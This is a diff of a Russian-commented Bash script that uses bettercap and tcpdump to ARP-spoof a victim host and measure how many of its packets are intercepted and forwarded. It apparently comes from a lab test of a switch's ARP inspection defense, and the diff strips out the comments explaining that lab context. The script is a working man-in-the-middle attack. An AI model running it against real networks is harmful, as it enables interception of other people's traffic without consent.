@@ -7,9 +7,6 @@
 #  Запуск:  sudo ./kali_intercept.sh eth0 192.168.10.11 25 eltex_off_07
 #  аргументы:  iface  IP-жертвы  длительность_сек  метка  [шлюз]
 #
-#  Делай ТОЛЬКО на прогоне БЕЗ защиты (DAI выкл) — там перехват должен
-#  состояться. На прогоне с DAI вкл IN/FWD должны быть ~0 (перехвата нет).
-#  Параллельно на жертве гони ping с меткой (trial.sh), чтобы было что ловить.
 # =====================================================================
 set -u
 IF=${1:-eth0}
@@ -29,15 +26,15 @@ sudo tcpdump -i "$IF" -e -w "$PCAP" "arp or (icmp and (host $VIP or host $GW))" 
 TPID=$!
 sleep 2
 
-# 2. Атака (включили -> подержали -> чисто выключили -> вышли)
+
 (
   sleep 2
   echo "set arp.spoof.targets $VIP"
   echo "set arp.spoof.fullduplex true"
   echo "set net.sniff.verbose false"
   echo "net.recon on"
-  echo "net.probe on"          # активно находим хосты, иначе bettercap не знает MAC цели
-  sleep 6                      # даём recon найти жертву ДО травли
+  echo "net.probe on"
+  sleep 6
   echo "arp.spoof on"
   sleep "$DUR"
   echo "arp.spoof off"
@@ -64,7 +61,3 @@ echo "Пакетов жертвы пришло на Kali (eth.dst=$KMAC): $IN   
 echo "Из них переслано к шлюзу (eth.src=$KMAC): $FWD           -> MITM с пересылкой"
 echo "pcap: $PCAP"
 echo
-echo "Для скриншота в Wireshark открой $PCAP и поставь фильтр:"
-echo "  icmp && ip.src==$VIP && eth.dst==$KMAC"
-echo "каждая строка = пакет жертвы к шлюзу, пришедший на Kali = доказательство перехвата."
-echo "Доля перенаправленного = $IN / (сколько жертва отправила, берёшь из trial.sh)."
